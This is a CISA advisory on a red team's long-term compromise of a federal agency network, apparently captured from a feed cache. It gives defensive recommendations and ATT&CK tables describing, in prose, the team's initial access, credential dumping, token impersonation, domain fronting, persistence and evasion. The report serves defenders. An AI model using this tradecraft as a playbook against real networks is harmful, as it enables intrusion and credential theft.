<li>Promote a culture of ongoing improvement while also fostering a proactive approach among employees to promptly report suspicious activities.</li>
<li>Treat suspected incidents of compromise as a confirmed breach, and account for a threat actor’s ability to move laterally when defining the scope of incident response efforts.</li>
</ul>
</td>
</tr>
<tr>
<td>Focus on known/common IOCs</td>
<td>
<ul>
<li>Employ centralized logging and tool-agnostic detection methods.</li>
<li>Leverage threat intelligence feeds by integrating them into a SIEM tool.</li>
<li>Implement regular updates for IOCs and TTPs, with the capability for customization to address the specific threat landscape [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>].</li>
</ul>
</td>
</tr>
<tr>
<td>Detection rules were visible from compromised systems</td>
<td>
<ul>
<li>Integrate runtime detection mechanisms while removing world-readable configuration files from installer deployments where applicable.</li>
</ul>
</td>
</tr>
<tr>
<td>Insufficient restriction of admin tools</td>
<td>
<ul>
<li>Enhance security posture by implementing application allowlisting to ensure only trusted and approved applications are permitted [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#HardwareandSoftwareApprovalProcess2Q\" title=\"Hardware and Software Approval Process (2.Q)\">CPG 2.Q</a>].</li>
<li>Apply the principle of least privilege by granting users only the minimum level of access necessary to perform job functions.</li>
</ul>
</td>
</tr>
<tr>
<td>Insufficient tracking of software</td>
<td>
<ul>
<li>Conduct a comprehensive inventory of assets and establish a baseline for behavior [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#AssetInventory1A\" title=\"Asset Inventory (1.A)\">CPG 1.A</a>].</li>
<li>Utilize a Software Asset Management (SAM) solution that offers comprehensive tracking, reporting, and compliance management capabilities.</li>
<li>Deploy automated discovery and monitoring tools to continuously scan and identify new and existing software.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p>CISA recommends organizations implement the recommendations in Table 2 to mitigate other identified issues that can be uncovered through traditional penetration tests or red team assessments.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2: Recommendations to Mitigate Identified Issues</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Issue</strong></th>
<th role=\"columnheader\"><strong>Recommendation</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Accounts were overprivileged and the organization’s network contained unnecessary service accounts</td>
<td>
<ul>
<li>Apply the principle of least privilege when assigning permissions to user accounts. Audit existing group memberships, strip unnecessary privileges, and prune unnecessary nested groups/users.</li>
<li>Monitor for account lockout, especially on administrative accounts, and switch to a manual account unlock policy.</li>
<li>Increase monitoring for higher-risk accounts, such as service accounts, that are highly privileged and have a predictable pattern of behavior (e.g., scans that reliably run at a certain hour of the day).</li>
<li>Privileged users should have dedicated role-based user accounts and associated jump hosts to log into critical resources.</li>
</ul>
</td>
</tr>
<tr>
<td>Insufficient EDR configuration</td>
<td>
<ul>
<li>Ensure all hosts have a form of EDR installed.</li>
<li>Deploy an EDR capable of catching commonly known obfuscation or execution techniques.</li>
</ul>
</td>
</tr>
<tr>
<td>Insecure and insufficient credentials</td>
<td>
<ul>
<li>Ensure sensitive credentials and documents are not stored in an accessible place.</li>
<li>Mandate strong and complex passwords [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MinimumPasswordStrength2B\" title=\"Minimum Password Strength (2.B)\">CPG 2.B</a>]. For more information, see CISA’s <a href=\"https://www.cisa.gov/secure-our-world/require-strong-passwords\" title=\" Secure Our World: Require Strong Passwords\">Secure Our World: Require Strong Passwords.</a></li>
</ul>
</td>
</tr>
</tbody>
</table>
<p><strong>Note:</strong> The above mitigations apply to critical infrastructure organizations with on-premises or hybrid environments. CISA encourage all organizations to <strong>prioritize purchasing products from manufacturers who demonstrate secure by design principles</strong>, such as evidenced by follow-on publications from companies who have signed the&nbsp;<a href=\"https://www.cisa.gov/securebydesign/pledge\" title=\" Secure by Design Pledge\">Secure by Design Pledge</a>.</p>
<h4><strong>Software Manufacturers</strong></h4>
<p>CISA recognizes that insecure software is the root cause of many flaws; the responsibility should not rest on the end user. CISA urges software manufacturers to implement the following:</p>
<ul>
<li><a href=\"https://www.cisa.gov/resources-tools/resources/secure-design-alert-how-manufacturers-can-protect-customers-eliminating-default-passwords\" title=\"Secure by Design Alert: How Manufacturers Can Protect Customers by Eliminating Default Passwords\"><strong>Eliminate default passwords</strong></a><strong>&nbsp;</strong>and determine what password practices should be required (such as minimum password length and disallowing known breached passwords). Configure software to use more secure authentication schemes by default.</li>
<li><strong>Provide logging at no additional charge</strong>. Cloud services and on-premises products should commit to generating and storing security related logs at no additional cost.</li>
<li><strong>Work with security information and event management (SIEM) and security orchestration, automation, and response (SOAR) providers</strong>—in conjunction with customers—to understand how response teams use logs to investigate incidents. The goal is to develop logs that yield a comprehensive story of the event.</li>
<li><strong>Remove unnecessary software dependencies</strong>. Unnecessary software increases the attack surface available to adversaries and may introduce additional vulnerabilities. Mitigating these additional vulnerabilities requires significant investment, consuming resources like time, technical personnel, and adding to the level of security effort.</li>
</ul>
<p>These mitigations align with tactics provided in the joint guide <a href=\"https://www.cisa.gov/sites/default/files/2023-10/Shifting-the-Balance-of-Cybersecurity-Risk-Principles-and-Approaches-for-Secure-by-Design-Software.pdf\" title=\"Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software\">Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software</a>. CISA urges software manufacturers to take ownership of improving the security outcomes of their customers by applying these and other secure by design tactics. By using secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to spend additional resources making configuration changes, purchasing security software and logs, monitoring, and making routine updates.&nbsp;</p>
<p>For more information on secure by design, see CISA’s <a href=\"https://www.cisa.gov/securebydesign\" title=\" Secure by Design\">Secure by Design</a> webpage. For more information on common misconfigurations and guidance on reducing their prevalence, see joint advisory <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-278a\" title=\"NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations\">NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations</a>.</p>
<h3>VALIDATE SECURITY CONTROLS</h3>
<p>In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see Tables 3–11).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<p>CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>
<h3>RESOURCES</h3>
<ul>
<li><a href=\"https://www.cisa.gov/resources-tools/resources/layering-network-security-through-segmentation-infographic\" title=\"Layering Network Security Through Segmentation Infographic\">Layering Network Security Through Segmentation</a></li>
<li><a href=\"https://www.cisa.gov/resources-tools/resources/ics-recommended-practices\" title=\"ICS Recommended Practices - Recommended Practice: Improving Industrial Control System Cybersecurity with Defense-in-Depth Strategies\">Recommended Practice: Improving Industrial Control System Cybersecurity with Defense-in-Depth Strategies</a></li>
<li><a href=\"https://www.cisa.gov/resources-tools/resources/phishing-guidance-stopping-attack-cycle-phase-one\" title=\"Phishing Guidance: Stopping the Attack Cycle at Phase One\">Phishing Guidance: Stopping the Attack Cycle at Phase One</a></li>
<li><a href=\"https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm\" title=\"BOFs\">BOFs</a></li>
<li><a href=\"https://blog.blacklanternsecurity.com/p/detecting-dcsync\" title=\"Detecting DCSync\">Detecting DCSync</a></li>
<li><a href=\"https://pentestlaboratories.com/2020/05/26/appdomainmanager-injection-and-detection/\" title=\"AppDomainManager Injection and Detection\">App Domain Hijacking Overview</a></li>
</ul>
<h3>DISCLAIMER</h3>
<p>The information in this report is being provided “as is” for informational purposes only. CISA does not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA.</p>
<h3>VERSION HISTORY</h3>
<p>July 11, 2024: Initial version.</p>
<h3>APPENDIX: MITRE ATT&amp;CK TACTICS AND TECHNIQUES</h3>
<p>See Tables 3–11 for all referenced threat actor tactics and techniques in this advisory.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 3: Reconnaissance</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Search Victim-Owned Websites</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1594/\" title=\"Search Victim-Owned Websites\">T1594</a></td>
<td>CISA’s red team used open source tools and services to probe the organization’s internet-facing presence and gather information, including names, roles, and contact information.</td>
</tr>
<tr>
<td>Gather Victim Network Information: DNS</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1590/002/\" title=\"Gather Victim Network Information: DNS\">T1590.002</a></td>
<td>The red team gathered information about the organization’s DNS records, which revealed several details about the organization's internal network.</td>
</tr>
<tr>
<td>Gather Victim Identity Information: Employee Names</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1589/003/\" title=\"Gather Victim Identity Information: Employee Names\">T1589.003</a></td>
<td>CISA’s red team collected the assessed organizations’&nbsp;employee names to use their email addresses for specific targeting based on roles and responsibilities.</td>
</tr>
<tr>
<td>Gather Victim Org Information: Identity Roles</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1591/004/\" title=\"Gather Victim Org Information: Identity Roles\">T1591.004</a></td>
<td>CISA’s red team selected specific individuals from the assessed organization and targeted them with phishing payloads.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4: Command and Control</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Application Layer Protocol: Web Protocols</td>
<td><a href=\"https://attack.mitre.org/techniques/T1071/001/\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a></td>
<td>The red team exploited <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-21587\" title=\"CVE-2022-21587 Detail\">CVE-2022-21587</a> and ran a RAT that provided consistent C2 via open Transmission Control Protocol (TCP) ports.</td>
</tr>
<tr>
<td>Non-Standard Port</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1571/\" title=\"Non-Standard Port\">T1571</a></td>
<td>The red team used SSH over ports <code>80</code> and/or <code>443</code> when establishing outbound C2.</td>
</tr>
<tr>
<td>Proxy: Domain Fronting</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/004/\" title=\"Proxy: Domain Fronting\">T1090.004</a></td>
<td>CISA’s red team leveraged domain fronting to redirect and obfuscate their traffic.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5: Credential Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Brute Force: Password Cracking</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/002/\" title=\"Brute Force: Password Cracking\">T1110.002</a></td>
<td>The red team cracked an account’s password by using a common wordlist.</td>
</tr>
<tr>
<td>OS Credential Dumping: DCSync</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/006/\" title=\"OS Credential Dumping: DCSync\">T1003.006</a></td>
<td>CISA’s red team pulled credentials for the domain via DCSync to gain full access to the domain.</td>
</tr>
<tr>
<td>Unsecured Credentials: Bash History</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1552/003/\" title=\"Unsecured Credentials: Bash History\">T1552.003</a></td>
<td>The red team obtained a password by searching a user’s bash command history, which provided further unprivileged access throughout the network.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6: Discovery</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Domain Trust Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1482/\" title=\"Domain Trust Discovery\">T1482</a></td>
<td>CISA’s red team inspected the assessed organization’s&nbsp;domain trust relationships through LDAP and identified potential connections in external organizations to which to move laterally.</td>
</tr>
<tr>
<td>File and Directory Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1083/\" title=\"File and Directory Discovery\">T1083</a></td>
<td>The red team data mined numerous internal servers and discovered one misconfigured share that contained plaintext usernames and passwords for several privileged service accounts.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7: Privilege Escalation</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Hijack Execution Flow: Path Interception by PATH Environment Variable</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1574/007/\" title=\"Hijack Execution Flow: Path Interception by PATH Environment Variable\">T1574.007</a></td>
<td>The red team hijacked the execution flow of a program that used a relative path instead of an absolute path, which enabled the capture of the account’s password.</td>
</tr>
<tr>
<td>Access Token Manipulation: Token Impersonation/Theft</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1134/001/\" title=\"Access Token Manipulation: Token Impersonation/Theft\">T1134.001</a></td>
<td>CISA’s red team impersonated the tokens of current users to exploit valid sessions and bypass the organization’s IDM.</td>
</tr>
<tr>
<td>Access Token Manipulation: Make and Impersonate Token</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1134/003/\" title=\"Access Token Manipulation: Make and Impersonate Token\">T1134.003</a></td>
<td>CISA’s red team created new tokens and logon sessions for accounts not registered with the IDM to escalate privileges.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8: Lateral Movement</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Services: SSH</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/004/\" title=\"Remote Services: SSH\">T1021.004</a></td>
<td>CISA’s red team used SSH with a valid account to move through the enclave.</td>
</tr>
<tr>
<td>Proxy</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a></td>
<td>The red team used a SOCKS proxy to avoid direct connections to their infrastructure and obscure the source of the malicious traffic.</td>
</tr>
<tr>
<td>Use Alternate Authentication Material: Pass the Hash</td>
<td><a href=\"https://attack.mitre.org/techniques/T1550/002/\" title=\"Use Alternate Authentication Material: Pass the Hash\">T1550.002</a></td>
<td>The red team’s operations were hindered by the organization’s IDM when it blocked the team's attempts to bypass system access controls using different hash types for authentication.</td>
</tr>
<tr>
<td>Use Alternate Authentication Material: Pass the Ticket</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1550/003/\" title=\"Use Alternate Authentication Material: Pass the Ticket\">T1550.003</a></td>
<td>CISA’s red team’s operations were hindered by the organization’s &nbsp;IDM when it blocked the team’s attempts to bypass system access controls using Kerberos tickets for authentication.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9: Collection</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Data from Local System</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1005/\" title=\"Data from Local System\">T1005</a></td>
<td>CISA’s red team searched each host for files containing sensitive or interesting information such as password hashes, account information, network configurations, etc.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10: Persistence</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Scheduled Task/Job: Cron</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/003/\" title=\"Scheduled Task/Job: Cron\">T1053.003</a></td>
<td>The red team used the <code>cron</code> utility to perform task scheduling and execute malicious code within Unix systems at specified times.</td>
</tr>
<tr>
<td>Scheduled Task/Job: At</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/002/\" title=\"Scheduled Task/Job: At\">T1053.002</a></td>
<td>CISA’s red team used the <code>at</code> utility to perform task scheduling and execute malicious code within Unix systems at a specified time and date.</td>
</tr>
<tr>
<td>Hijack Execution Flow: AppDomainManager</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1574/014/\" title=\"Hijack Execution Flow: AppDomainManager\">T1574.014</a></td>
<td>The red team executed malicious payloads by hijacking how the <code>.NETAppDomainManager</code> loads assemblies.</td>
</tr>
<tr>
<td>Valid Accounts: Domain Accounts</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a></td>
<td>CISA’s red team regularly used compromised valid domain accounts managed by Active Directory, giving access to resources of the domain.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 11: Defensive Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Masquerading: Masquerade Task or Service</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/004/\" title=\"Masquerading: Masquerade Task or Service\">T1036.004</a></td>
<td>The red team enumerated local files and running processes to gather information for their payloads and persistence mechanisms to appear as legitimate activity.</td>
</tr>
<tr>
<td>Obfuscated Files or Information</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1027/\" title=\"Obfuscated Files or Information\">T1027</a></td>
<td>CISA’s red team encrypted, encoded, and obfuscated their executables and C2 channels to evade defenses across the network.</td>
</tr>
<tr>
<td>File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1222/002/\" title=\"File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification\">T1222.002</a></td>
<td>The red team modified file permissions with <code>touch</code> and <code>chmod/chown</code> commands to obfuscate their activity and blend in with other files in the environment.</td>
</tr>
<tr>
<td>Indicator Removal: Timestomp</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1070/006/\" title=\"Indicator Removal: Timestomp\">T1070.006</a></td>
<td>CISA’s red team modified file timestamps to hide their operational activity.</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>" "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-193a" (26253 3180) new 7 nil nil ((title nil " CISA Red Team’s Operations Against a Federal Civilian Executive Branch Organization Highlights the Necessity of Defense-in-Depth") (link nil "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-193a") (description nil "<h3>EXECUTIVE SUMMARY</h3>
<p>In early 2023, the Cybersecurity and Infrastructure Security Agency (CISA) conducted a SILENTSHIELD red team assessment against a Federal Civilian Executive Branch (FCEB) organization. During SILENTSHIELD assessments, the red team first performs a no-notice, long-term simulation of nation-state cyber operations. The team mimics the techniques, tradecraft, and behaviors of sophisticated threat actors and measures the potential dwell time actors have on a network, providing a realistic assessment of the organization’s security posture. Then, the team works directly with the organization’s network defenders, system administrators, and other technical staff to address strengths and weaknesses found during the assessment. The team’s goal is to assist the organization with refining their detection, response, and hunt capabilities—particularly hunting unknown threats.</p>
<p>In coordination with the assessed organization, CISA is releasing this Cybersecurity Advisory (CSA) detailing the red team’s activity and tactics, techniques, and procedures (TTPs); associated network defense activity; and lessons learned to provide network defenders with recommendations for improving their organization’s detection capabilities and cyber posture.</p>
<p>During the first phase, the SILENTSHIELD team gained initial access by exploiting a known vulnerability in an unpatched web server in the victim’s Solaris enclave. Although the team fully compromised the enclave, they were unable to move into the Windows portion of the network due to a lack of credentials. In a parallel effort, the team gained access to the Windows network through phishing. They then discovered unsecured administrator credentials, allowing them to pivot freely throughout the Windows environment, which resulted in full domain compromise and access to tier zero assets. The team then identified that the organization had trust relationships with multiple external partner organizations and was able to exploit and pivot to an external organization. The red team remained undetected by network defenders throughout the first phase.</p>
<p><strong>The red team’s findings underscored the importance of defense-in-depth and using diversified layers of protection.</strong>&nbsp;The organization was only able to fully understand the extent of the red team’s compromise by running full diagnostics from all data sources. This involved analyzing&nbsp;host-based logs, internal network logs, external (egress) network logs, and authentication logs.</p>
<p>The red team’s findings also demonstrated the value of using tool-agnostic and behavior-based indicators of compromise (IOCs) and of applying an “allowlist” approach to network behavior and systems, rather than a “denylist” approach, which predominantly results in an unmanageable amount of noise. The red team’s findings illuminated the following lessons learned for network defenders about how to reduce and respond to risk:</p>
<ul>
<li><strong>Lesson learned:</strong>&nbsp;The assessed organization had insufficient controls to prevent and detect malicious activity.</li>
<li><strong>Lesson learned:</strong> The organization did not effectively or efficiently collect, retain, and analyze logs.</li>
<li><strong>Lesson learned:</strong> Bureaucratic processes and decentralized teams hindered the organization’s network defenders.</li>
<li><strong>Lesson learned:</strong> A “known-bad” detection approach hampered detection of alternate TTPs.</li>
</ul>
<p>To reduce risk of similar malicious cyber activity, CISA encourages organizations to apply the recommendations in the Mitigations section of this advisory, including those listed below:</p>
<ul>
<li><strong>Apply defense-in-depth principles</strong> by using multiple layers of security to ensure comprehensive analysis and detection of possible intrusions.</li>
<li><strong>Use robust network segmentation</strong> to impede lateral movement across the network.</li>
<li><strong>Establish baselines of network traffic, application execution, and account authentication</strong>. Use these baselines to enforce an “allowlist” philosophy rather than denying known-bad IOCs. Ensure monitoring and detection tools and procedures are primarily behavior-based, rather than IOC-centric.</li>
</ul>
<p>CISA recognizes that insecure software contributes to these identified issues and urges software manufacturers to embrace&nbsp;<a href=\"https://www.cisa.gov/securebydesign\" title=\"Secure by Design\">Secure by Design</a> principles and implement&nbsp;the recommendations in the Mitigations section of this CSA, including those listed below, to&nbsp;harden customer networks against malicious activity and reduce the likelihood of domain compromise:</p>
<ul>
<li><strong>Eliminate default passwords.</strong></li>
<li><strong>Provide logging at no additional charge</strong>.</li>
<li><strong>Work with security information and event management (SIEM) and security orchestration, automation, and response (SOAR) providers</strong>—in conjunction with customers—to understand how response teams use logs to investigate incidents.</li>
</ul>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-07/csa-cisa-red-team%27s-operations-against-a-fceb-organization-highlights-the-necessity-of-defense-in-depth_0.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-193A CISA Red Team’s Operations Against a Federal Civilian Executive Branch Organization Highlights the Necessity of Defense-in-Depth</a>
    <span class=\"c-file__size\">(PDF,       1.18 MB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-10/csa-cisa-red-team_s-operations-against-a-fceb-organization-highlights-the-necessity-of-defense-in-depth_0_ES.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-193A CISA Red Team’s Operations Against a Federal Civilian Executive Branch Organization Highlights the Necessity of Defense-in-Depth - Spanish Translation</a>
    <span class=\"c-file__size\">(PDF,       1.06 MB
  )</span>
  </div>
</div>
<h3>INTRODUCTION</h3>
<p>CISA has authority to hunt for and identify, with or without advance notice to or authorization from agencies, threats and vulnerabilities within federal information systems (see generally 44 U.S.C. § 3553[b][7]). The target organization for this assessment was a large U.S. FCEB organization. CISA conducted the SILENTSHIELD assessment over an approximately eight-month period in 2023, with three of the months consisting of a technical collaboration phase:</p>
<ul>
<li><strong>Adversary Emulation Phase:&nbsp;</strong>The team<strong>&nbsp;</strong>started by<strong>&nbsp;</strong>emulating a sophisticated nation-state actor by simulating known initial access and post-exploitation TTPs. The team’s goal was to compromise the assessed organization’s domain and identify attack paths to other networks. After completion of their initial objectives, the team diversified its deployed tools and tradecraft to mimic a wider and often less sophisticated set of threat actors to elicit network defender attention. CISA red team members did not clean up or delete system logs, allowing defenders to investigate all artifacts and identify the full scope of a breach.</li>
<li><strong>Collaboration Phase:</strong> The SILENTSHIELD team met regularly with senior staff and technical personnel to discuss issues with the organization’s cyber defensive capabilities. During this phase, the team:
<ul>
<li>Proposed new behavior-based and tool-agnostic detections to uncover additional tradecraft used during the Adversary Emulation Phase. They also evaluated the organization’s improvements according to current CISA priorities and public guidance.</li>
<li>Troubleshot existing detection steps to show how certain TTPs evaded IOC-based detections.</li>
<li>Deconflicted events from CISA red team activity, indicating unexpected network/application behavior or the potential presence of a real adversary in the network.<br><br><strong>Note:</strong> The team’s goal during this phase was to build the organization’s ability to detect malicious activity based on adversary behavior (i.e., TTPs) vice relying on known IOCs.</li>
</ul>
</li>
</ul>
<p>This advisory, drafted in coordination with the assessed organization, details the red team’s activity and TTPs, associated network defense activity, and lessons learned to provide network defenders recommendations for improving their organization’s defensive cyber posture. The advisory also provides recommendations to software manufacturers to harden their customer networks against malicious activity and reduce the likelihood of domain compromise.</p>
<h3>TECHNICAL DETAILS</h3>
<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK for Enterprise</a> framework, version 15. See the MITRE ATT&amp;CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.&nbsp;</p>
<p>During the Adversary Emulation phase, the red team gained initial access to the organization’s Solaris enclave by exploiting a known vulnerability in an unpatched web server. They gained separate access to the Windows environment by phishing and were able to compromise the full domain and its parent domain.&nbsp;See Figure 1 for a timeline of this assessment and the sections below for details on the team’s activity and TTPs.</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/Figure%201%20-%20SILENTSHIELD%20Assessment%20Timeline.jpg?itok=-GInuA5O\" width=\"1024\" height=\"571\" alt=\"Figure 1: SILENTSHIELD Assessment Timeline\">


</div>
  </figure>
<h6>Figure 1: SILENTSHIELD assessment timeline</h6>
<h3>Adversary Emulation Phase</h3>
<h4><em>Exploitation of the Solaris Enclave</em></h4>
<h5><em>Reconnaissance, Initial Access, and Command and Control</em></h5>
<p>CISA’s red team used open source tools and third-party services to probe the organization’s internet-facing surface [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1594/\" title=\"Search Victim-Owned Websites\">T1594</a>]. This included non-intrusive port scans for common ports and Domain Name System (DNS) enumeration [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1590/002/\">T1590.002</a>]. These efforts revealed the organization’s web server was unpatched for <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-21587\" title=\"CVE-2022-21587 Detail\">CVE-2022-21587</a>, an unauthenticated remote code execution (RCE) vulnerability in Oracle Web Applications Desktop Integrator. For three months the assessed organization failed to patch this vulnerability, and the team exploited it for initial access.</p>
